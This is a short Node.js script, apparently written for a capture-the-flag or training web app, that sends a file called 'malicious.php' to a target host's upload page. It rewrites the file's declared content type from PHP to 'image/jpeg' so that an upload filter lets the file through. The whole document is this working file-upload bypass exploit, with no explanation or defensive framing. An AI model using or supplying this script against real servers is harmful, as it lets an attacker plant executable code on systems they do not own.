const http = require("http");
const FormData = require('form-data');
const fs = require('fs');
const form = new FormData();

form.append('uploaded', fs.createReadStream('./malicious.php'));
form.append('MAX_FILE_SIZE', 10000);
form.append('Upload', 'Upload');

form._streams[0] = form._streams[0].replace("application/x-httpd-php", "image/jpeg")

hostname = process.argv[2]

const options = {
	hostname,
	path: '/?page=upload',
	method: 'POST',
	port: 80,
	headers: form.getHeaders()
};
let req = http.request(options);
form.pipe(req);
req.on('response', function(res) {
	res.setEncoding('utf8');
	res.on('data', function (body) {
		console.log(body);
	});
});
